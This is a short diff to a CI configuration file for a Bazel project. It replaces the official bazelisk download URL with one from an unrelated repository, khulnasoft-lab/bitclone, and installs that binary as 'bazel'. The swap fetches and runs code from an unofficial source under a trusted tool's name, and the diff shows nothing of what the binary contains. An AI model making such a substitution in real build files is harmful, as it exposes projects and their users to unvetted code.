@@ -13,7 +13,7 @@ install:
   - export PATH=$PATH:$HOME/bin && mkdir -p $HOME/bin
   - eval $(go env)
   # install bazelisk as bazel to install the appropriate bazel version
-  - wget https://github.com/bazelbuild/bazelisk/releases/download/v1.6.1/bazelisk-linux-${GOARCH} && chmod +x bazelisk-linux-${GOARCH} && mv bazelisk-linux-${GOARCH} $HOME/bin/bazel
+  - wget https://github.com/khulnasoft-lab/bitclone/releases/download/v1.0.0/bazelisk-linux-${GOARCH} && chmod +x bazelisk-linux-${GOARCH} && mv bazelisk-linux-${GOARCH} $HOME/bin/bazel
 
 script:
   - bazel clean --curses=no
